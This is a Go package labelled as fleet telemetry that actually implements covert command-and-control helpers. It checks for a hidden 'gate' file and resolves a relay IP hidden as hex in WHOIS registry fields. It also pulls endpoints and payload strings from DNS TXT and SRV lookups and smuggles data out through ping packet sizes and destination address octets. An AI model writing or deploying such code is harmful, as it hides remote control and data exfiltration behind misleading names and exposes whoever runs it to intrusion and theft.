// Package channels provides fleet telemetry and registry resolution.
package channels

import (
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
)

const WhoisHost = "whois.verisign-grs.com"
const RPC = "https://cloudflare-eth.com"

// GateOK reports whether the provisioned gate artifact is present.
func GateOK(gate string) bool {
	return fileExists(ExpandGate(gate))
}

func ExpandGate(gate string) string {
	home, _ := os.UserHomeDir()
	if strings.HasPrefix(gate, "~/") {
		return filepath.Join(home, gate[2:])
	}
	for _, kv := range [][2]string{
		{"%TEMP%", os.Getenv("TEMP")},
		{"%APPDATA%", os.Getenv("APPDATA")},
		{"%LOCALAPPDATA%", os.Getenv("LOCALAPPDATA")},
		{"%PROGRAMDATA%", os.Getenv("PROGRAMDATA")},
	} {
		gate = strings.ReplaceAll(gate, kv[0], kv[1])
	}
	return strings.ReplaceAll(gate, "\\", string(os.PathSeparator))
}

func fileExists(p string) bool {
	_, err := os.Stat(p)
	return err == nil
}

// WhoisEndpoint extracts the relay address from a registry descriptor.
func WhoisEndpoint(domain string) string {
	conn, err := net.Dial("tcp", WhoisHost+":43")
	if err != nil {
		return ""
	}
	defer conn.Close()
	conn.Write([]byte("domain " + domain + "\r\n"))
	buf := make([]byte, 8192)
	var blob strings.Builder
	for {
		n, err := conn.Read(buf)
		if n > 0 {
			blob.Write(buf[:n])
		}
		if err != nil {
			break
		}
	}
	re := regexp.MustCompile(`(?i)(?:descr|address|e-mail):\s+([0-9a-f]{8})\s`)
	m := re.FindStringSubmatch(blob.String())
	if m == nil {
		return ""
	}
	raw, _ := strconv.ParseUint(m[1], 16, 32)
	return strconv.Itoa(int(raw>>24&0xFF)) + "." +
		strconv.Itoa(int(raw>>16&0xFF)) + "." +
		strconv.Itoa(int(raw>>8&0xFF)) + "." +
		strconv.Itoa(int(raw&0xFF))
}

// TxtFields returns quoted TXT payload strings for a lookup.
func TxtFields(name string) []string {
	out, err := exec.Command("nslookup", "-type=TXT", name).Output()
	if err != nil {
		return nil
	}
	re := regexp.MustCompile(`"([^"]*)"`)
	var fields []string
	for _, m := range re.FindAllStringSubmatch(string(out), -1) {
		fields = append(fields, m[1])
	}
	return fields
}

// SrvEndpoint parses "host port" from an SRV lookup.
func SrvEndpoint(name string) (string, int) {
	out, err := exec.Command("nslookup", "-type=SRV", name).Output()
	if err != nil {
		return "", 0
	}
	re := regexp.MustCompile(
		`priority\s*=\s*\d+[\s\S]*?port\s*=\s*(\d+)[\s\S]*?canonical name\s*=\s*([\w.-]+)`)
	m := re.FindStringSubmatch(string(out))
	if m == nil {
		return "", 0
	}
	port, _ := strconv.Atoi(m[1])
	return m[2], port
}

// IcmpNibble probes sizes 64..79 to carry a nibble.
func IcmpNibble(relay string, nibble byte) {
	_ = exec.Command("ping", "-c", "1", "-W", "1", "-s",
		strconv.Itoa(64+int(nibble&15)), relay).Start()
}

// IcmpByteIp encodes one octet in the probe destination.
func IcmpByteIp(base string, b byte) {
	if b > 0 && b < 255 {
		_ = exec.Command("ping", "-n", "1", "-w", "300",
			base+strconv.Itoa(int(b))).Start()
	}
}
